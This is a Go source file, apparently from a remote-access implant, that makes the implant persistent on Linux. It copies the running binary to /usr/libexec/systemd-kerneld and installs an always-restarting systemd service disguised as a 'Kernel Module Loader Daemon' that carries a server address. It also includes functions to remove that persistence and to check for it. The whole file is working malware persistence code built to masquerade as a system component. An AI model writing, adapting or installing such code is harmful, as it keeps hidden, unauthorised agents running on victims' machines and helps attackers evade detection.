package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const persistentAgent = "/usr/libexec/systemd-kerneld"
const persistentUnit = "/etc/systemd/system/systemd-kerneld.service"
const systemctl = "/usr/bin/systemctl"

func installPersistence() error {
	if strings.ContainsAny(serverAddr, " \t\r\n") {
		return fmt.Errorf("invalid server address")
	}
	self, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("read running agent: %w", err)
	}
	if err := os.MkdirAll(filepath.Dir(persistentAgent), 0700); err != nil {
		return err
	}
	if err := atomicWrite(persistentAgent, self, 0700); err != nil {
		return err
	}
	unit := `[Unit]
Description=Kernel Module Loader Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment=RKLINGS_SERVER_ADDR=` + serverAddr + `
ExecStart=` + persistentAgent + `
Restart=always
RestartSec=5s

[Install]
WantedBy=multi-user.target
`
	if err := atomicWrite(persistentUnit, []byte(unit), 0600); err != nil {
		return err
	}
	if out, err := exec.Command(systemctl, "daemon-reload").CombinedOutput(); err != nil {
		return fmt.Errorf("daemon-reload: %w: %s", err, out)
	}
	if out, err := exec.Command(systemctl, "enable", "systemd-kerneld.service").CombinedOutput(); err != nil {
		return fmt.Errorf("enable service: %w: %s", err, out)
	}
	return nil
}

func atomicWrite(path string, data []byte, mode os.FileMode) error {
	directory := filepath.Dir(path)
	temporary, err := os.CreateTemp(directory, ".sd-*")
	if err != nil {
		return err
	}
	name := temporary.Name()
	defer os.Remove(name)
	if err := temporary.Chmod(mode); err != nil {
		_ = temporary.Close()
		return err
	}
	if _, err := temporary.Write(data); err != nil {
		_ = temporary.Close()
		return err
	}
	if err := temporary.Sync(); err != nil {
		_ = temporary.Close()
		return err
	}
	if err := temporary.Close(); err != nil {
		return err
	}
	if err := os.Rename(name, path); err != nil {
		return err
	}
	dir, err := os.Open(directory)
	if err != nil {
		return err
	}
	defer dir.Close()
	return dir.Sync()
}

func removePersistence() error {
	_ = exec.Command(systemctl, "disable", "systemd-kerneld.service").Run()
	if err := os.Remove(persistentUnit); err != nil && !os.IsNotExist(err) {
		return err
	}
	if err := os.Remove(persistentAgent); err != nil && !os.IsNotExist(err) {
		return err
	}
	if out, err := exec.Command(systemctl, "daemon-reload").CombinedOutput(); err != nil {
		return fmt.Errorf("daemon-reload: %w: %s", err, out)
	}
	return nil
}

func persistenceInstalled() bool {
	_, agentErr := os.Stat(persistentAgent)
	_, unitErr := os.Stat(persistentUnit)
	return agentErr == nil && unitErr == nil
}
